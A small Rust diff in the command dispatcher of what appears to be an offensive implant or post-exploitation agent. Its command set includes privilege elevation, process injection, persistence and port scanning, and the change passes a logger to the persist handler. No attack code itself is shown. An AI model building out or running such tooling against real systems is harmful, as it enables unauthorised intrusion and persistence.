@@ -104,7 +104,7 @@ impl NotionCommand {
             CommandType::Elevate(s)  => elevate::handle(&s, config_options).await,
             CommandType::Getprivs    => getprivs::handle().await,
             CommandType::Inject(s)   => inject::handle(&s, logger).await,
-            CommandType::Persist(s)  => persist::handle(&s, config_options).await,
+            CommandType::Persist(s)  => persist::handle(&s, config_options, logger).await,
             CommandType::Portscan(s) => portscan::handle(&s, logger).await,
             CommandType::Ps          => ps::handle().await,
             CommandType::Pwd         => pwd::handle().await,
